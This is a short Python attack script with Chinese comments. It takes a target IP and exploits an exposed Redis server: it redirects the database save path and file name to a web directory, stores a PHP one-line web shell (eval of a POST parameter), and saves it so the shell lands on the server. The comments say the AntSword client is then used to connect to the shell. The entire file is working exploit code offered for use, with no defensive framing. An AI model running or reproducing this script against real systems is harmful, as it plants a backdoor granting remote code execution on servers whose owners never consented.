import redis


# 1. 连接到 Redis 服务器
def connect_to_redis(redis_host, redis_port=6379):
    return redis.Redis(host=redis_host, port=redis_port, decode_responses=True)


# 2. 修改 Redis 数据库路径并生成 PHP WebShell 文件
def upload_webshell(r, webshell_dir, webshell_filename, webshell_content):
    # 修改 Redis 数据库的保存路径
    r.config_set("dir", webshell_dir)
    print(f"已将 Redis 数据库路径设置为: {webshell_dir}")

    # 设置保存文件名为指定的 PHP 文件名
    r.config_set("dbfilename", webshell_filename)
    print(f"保存文件名设置为: {webshell_filename}")

    # 将 WebShell 内容写入 Redis 缓存
    r.set("xxx", f"\r\n\r\n{webshell_content}\r\n\r\n")
    print(f"WebShell 内容已写入 Redis 缓存。")

    # 保存并生成 PHP 文件
    r.save()
    print(f"文件 {webshell_filename} 已成功生成并写入 {webshell_dir} 目录中。")


# 3. 主流程
def main():
    redis_host = input("请输入目标 Redis 服务器的 IP 地址: ")
    webshell_dir = input("请输入 WebShell 目标路径(可输入默认/var/www/html/): ")
    webshell_filename = input("请输入 WebShell 文件名（如 1.php）: ")

    # 一句话木马，蚁剑连接时使用
    webshell_content = "<?php eval($_POST['hack']);?>"

    r = connect_to_redis(redis_host)

    upload_webshell(r, webshell_dir, webshell_filename, webshell_content)
    print("WebShell <?php eval($_POST['hack']);?>上传成功，可以通过蚁剑连接进行下一步操作。")


if __name__ == "__main__":
    main()
